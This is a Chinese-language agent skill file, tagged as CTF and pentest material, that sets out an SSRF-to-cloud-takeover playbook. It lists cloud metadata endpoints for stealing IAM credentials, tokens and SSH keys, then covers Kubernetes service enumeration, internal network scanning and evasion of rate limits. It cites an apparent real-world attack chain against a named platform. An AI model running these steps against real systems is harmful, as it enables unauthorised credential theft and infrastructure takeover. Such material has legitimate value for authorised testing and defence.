---
name: 盗天·云骨
description: "有SSRF或云目标时枚举元数据拿云凭据. 触发: SSRF/169.254.169.254."
version: 1.0.0
license: MIT
platforms: [linux]
metadata:
    tags: [ssrf, cloud, metadata, openstack, aws, gcp, iam]
    category: ctf-pentest
---

> **盗天**
> 自身本是轮回客，踏遍万里寻归途！
> 盗亦有道留一线，手到偷来不问途。

# 云元数据收割 (Cloud Metadata Harvesting)

## 触发条件
- 已获得 SSRF (回显式最好) 且目标疑似云主机
- 目标是 OVH/Hetzner/AWS/GCP/Azure 等云上 SaaS / K8s 平台
- 需要从"任意 URL 请求"升级为"云凭据 + 集群接管"

## 第一步: SSRF 入口发现 (平台类目标)
交易/支付/SaaS 平台的**外部账号连接端点**是高频 SSRF 点:
- 特征: 添加交易所/银行/支付渠道账号, 提交 `base_url` / `path` / `api_url` / `webhook` / `rpc_url` 参数
- 本案例: `POST /api/accounts/extended?base_url=API&path=<完整URL>` — **path 接受完整 URL, 后端 python-httpx 直接请求并回显响应体** (回显式 SSRF!)
- 测试法: path 指向自己控制的 webhook (webhook.site 建 token 后可 API 拉取请求: `GET /token/<uuid>/requests`), 观察后端是否真实出网; 回显 200 + 目标内容 = 回显式
- 若无回显: 用 webhook.site 记录请求即可证明盲 SSRF, 再结合响应差异 (200/404/500) 做内网端口探测
- **注意**: "500 Internal Server Error" 在回显式 SSRF 里 = 目标连接失败/端口关闭 (不是目标响应!) — 用响应文本区分: 目标真实响应会带其内容 (Squid 400 页、nginx 404、JSON body)

## 第二步: 元数据端点 (按 provider)
| Provider | 端点 | 关键数据 |
|---|---|---|
| **OpenStack** (OVH/Hetzner/私有云) | `http://169.254.169.254/openstack/latest/meta_data.json` | **ovh-token**、K8s 集群 URL、node_ip、SSH 公钥、私网 CIDR |
| OpenStack user_data | `/openstack/latest/user_data`, `/openstack/latest/vendor_data.json` | cloud-init 配置 |
| **AWS EC2** (兼容端点常同时开) | `/latest/meta-data/`, `/latest/meta-data/iam/security-credentials/`, `/latest/user-data`, `/latest/meta-data/public-keys/0/openssh-key` | IAM 临时凭据、SSH key |
| **GCP** | `/computeMetadata/v1/...` **需要 `Metadata-Flavor: Google` 头** — 无头控制权的 SSRF 打不动 | SA token |
| Azure | `/metadata/instance?api-version=2021-02-01` (需 `Metadata: true` 头) | 管理凭据 |

**Provider 指纹** (不用头也能判断):
- `availability-zone: nova` / `AZ: nova` → **OpenStack** (OVH)
- instance-id `i-xxxxx` + `public-keys/` → EC2 兼容
- `/latest/meta-data/` 200 但 `/computeMetadata/v1/` 404 → OpenStack 的 EC2 兼容端点 (无需头!) — **GCP 路径 404 时立刻试 OpenStack/EC2 路径**
- 每个 SSRF 请求可能落到不同节点 (LB) → **多读几次 meta_data.json 收集多个节点 token/拓扑**

## 第三步: 凭据→集群升级
- ovh-token / IAM 凭据 → 云 API 控制面 (OVH API 需 consumer key 签名, 裸 token 通常 401 — 但 token 可能对集群内部服务有效)
- 元数据里的 `apiserver_url` + K8s 版本 → 试 apiserver 6443/8443 (常仅集群网络可达 — 从 SSRF 打, 注意 TLS: httpx verify 会挡自签 kubelet 10250)
- 内网网段 (meta_data 的 private_network_cidr) → 全内网端口扫描 (SSRF 慢扫, 500=关闭) — 复用 `scripts/ssrf_internal_scan.py` 模板 (限流节奏 + token 自刷新 + 补充过滤: 只认 HTTP 服务, DB/Redis 端口即使开放也无法用 HTTP-SSRF 交互)

## 第四步: K8s 内部服务 DNS 枚举 (svc.cluster.local)
SSRF 可达集群内 pod 时, **不扫端口, 直接猜 K8s Service DNS**:
- 格式: `http://<service>.<namespace>.svc.cluster.local:80/`
- 锚点: 已知 ArgoCD 时其 ns 必存在 (`argocd-server.argocd`); 再穷举派生组件: repo-server/dex/redis/applicationset-controller/notifications-controller/application-controller (各端口: server 80/8080, repo-server 8081, dex 5556/5557, applicationset-webhook 7000, notifications 9001)
- 常见 ns×服务名组合 (api/gateway/admin/backend/postgres/redis/minio/grafana/ingress-nginx/traefik/kong...): 200=直达, 404/400/308=存在, **500 = DNS 失败/连接失败 (不存在或隔离)**
- **外部 403/526 的 内部 vhost (adm/argocd/admin/staging) 从集群 DNS 往往全开** — ArgoCD 2.6.x 面板直达
- **限制**: POST-only+无 Content-Type 的 SSRF 打 grpc-gateway (ArgoCD /api/v1/*) 全 **415** (webhook 抓包证实转发请求无 CT) — 面板看得见吃不着, 记录等"可带 CT 的 SSRF"入口或登录凭据

## 陷阱
- GCP metadata 必须带 `Metadata-Flavor: Google` 头; 无头控制时改打 EC2 兼容路径
- kubelet 10250/10255、etcd 2379、SSH 22 在托管 K8s 通常全闭或 TLS 验证挡
- 内网探测限流: 应用层限流按用户/全局, **127.0.0.x loopback 轮换无效**, XFF 注入被 CF 层拦 (error 1000)
- 大规模内网扫描会触发全局限流 (banned ~45s 冷却) — 控制并发, 断点续扫

## 案例参考
- `references/origami-ssrf-case.md` — origami.tech 实战: accounts/extended SSRF → OpenStack metadata → ovh-token/K8s 集群/内网地图全链
